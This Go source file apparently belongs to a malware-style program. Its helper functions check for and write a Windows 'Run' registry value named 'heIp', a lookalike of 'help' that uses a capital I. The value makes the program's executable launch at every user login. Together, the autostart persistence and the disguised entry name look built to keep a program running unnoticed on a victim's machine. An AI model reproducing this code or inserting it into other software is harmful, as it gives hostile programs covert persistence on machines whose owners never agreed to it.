package helpers

import (
	"fmt"
	"golang.org/x/sys/windows/registry"
	"log"
)
/*
CheckRegistery() function check the heIp name in Software\Microsoft\Windows\CurrentVersion\Run subkey to avoid rewrite.
*/
func CheckRegistery() error {
	hkey, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	_, _, err = hkey.GetStringValue("heIp")
	if err != nil {
		return err
	}
	return nil
}
/*
AddRegistery() function adds the heIp name with exepath in Software\Microsoft\Windows\CurrentVersion\Run subkey to start our program at startup.
*/
func AddRegistery(value string) {
	hkey, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	help, _, err := hkey.GetStringValue("heIp")
	if err != nil {
		err := hkey.SetStringValue("heIp", value)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		fmt.Println(help)
	}
}
